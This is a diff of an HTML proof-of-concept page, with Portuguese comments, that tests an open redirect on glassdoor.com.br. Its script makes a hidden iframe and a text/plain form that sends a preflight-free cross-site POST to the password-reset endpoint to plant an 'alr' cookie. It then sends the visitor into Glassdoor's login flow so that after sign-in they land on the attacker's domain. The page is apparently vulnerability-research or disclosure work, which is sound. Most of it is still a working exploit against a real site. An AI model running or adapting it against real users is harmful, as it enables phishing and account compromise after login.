@@ -5,29 +5,25 @@
 <h2>PoC – Open Redirect via cookie <code>alr</code></h2>
 <p>
 Esta página (origem externa – GitHub Pages) envia um <b>POST sem preflight</b> para
-<code>/auth/account/password/forgot/initiate</code> usando <code>&lt;form enctype="text/plain"&gt;</code>.
-O backend deve definir <code>alr=&lt;referer desta página&gt;</code>. Em seguida, redirecionamos para o
-login do Glassdoor. Após o login, se vulnerável, o Glassdoor consumirá o cookie <code>alr</code> e
-redirecionará de volta para este domínio.
+<code>/auth/account/password/forgot/initiate</code>, fazendo o Glassdoor definir
+<code>alr=&lt;referer desta página&gt;</code>. Em seguida, redireciona a vítima para uma
+página do Glassdoor que inicia o fluxo de login. Após autenticar, o site deve consumir
+o <code>alr</code> e redirecionar de volta para este domínio.
 </p>
 
 <pre id="log" style="background:#111;color:#eee;padding:10px;white-space:pre-wrap"></pre>
 
 <script>
 (function () {
-  const log = (m) => { 
-    const pre = document.getElementById('log'); 
-    pre.textContent += (typeof m === 'string' ? m : JSON.stringify(m)) + "\n"; 
-  };
+  const nextPath = "/index.htm"; // tente também "/member/profile" se preferir
+  const log = (m) => { const el = document.getElementById('log'); el.textContent += m + "\n"; };
 
-  // 1) cria iframe "sink" para receber a resposta sem mexer na tela
+  // cria iframe “sink” e form (text/plain) para evitar preflight CORS
   const iframe = document.createElement('iframe');
   iframe.name = 'sink';
   iframe.style.display = 'none';
   document.body.appendChild(iframe);
-  log("iframe criado.");
 
-  // 2) cria <form> dinamicamente (sem preflight) + textarea com JSON
   const form = document.createElement('form');
   form.action = 'https://www.glassdoor.com.br/auth/account/password/forgot/initiate';
   form.method = 'POST';
@@ -35,32 +31,25 @@ redirecionará de volta para este domínio.
   form.target = 'sink';
 
   const ta = document.createElement('textarea');
-  ta.name = ''; // corpo "bruto" (não envia cabeçalhos customizados)
+  ta.name = '';
   ta.value = JSON.stringify({ emailAddress: "victim@example.com" });
   form.appendChild(ta);
-
   document.body.appendChild(form);
-  log("form criado. Enviando POST…");
 
-  // 3) envia o POST
-  try {
-    form.submit();
-    log("POST enviado. Aguardar Set-Cookie do 'alr'…");
-  } catch (e) {
-    log("Falha ao enviar o form: " + e.message);
-  }
+  log("Enviando POST para setar cookie alr…");
+  try { form.submit(); } catch(e){ log("Falha ao enviar form: "+e.message); }
 
-  // 4) após curto delay, vá para o login do Glassdoor
+  // pequeno delay para o Set-Cookie do alr chegar
   setTimeout(function(){
-    log("Redirecionando para o login do Glassdoor…");
-    window.location.href = "https://www.glassdoor.com.br/auth/login";
-  }, 1500);
+    log("Redirecionando para o fluxo do Glassdoor: " + nextPath);
+    window.location.href = "https://www.glassdoor.com.br" + nextPath;
+  }, 1200);
 })();
 </script>
 
 <p style="font-size:12px;color:#666;margin-top:16px">
-Abra em janela anônima. Em <b>Application → Cookies → https://www.glassdoor.com.br</b>,
-confira se existe <code>alr</code> apontando para este GitHub Pages antes do login.
-Depois de logar, se o site estiver vulnerável, você será redirecionado de volta para este domínio.
+Use janela anônima. Antes do login, verifique em <b>Application → Cookies → https://www.glassdoor.com.br</b>
+se o cookie <code>alr</code> aponta para seu GitHub Pages. Depois faça o login normal; se vulnerável,
+você será redirecionado de volta ao seu domínio (ex.: <code>after-login.html</code>).
 </p>
 </body>
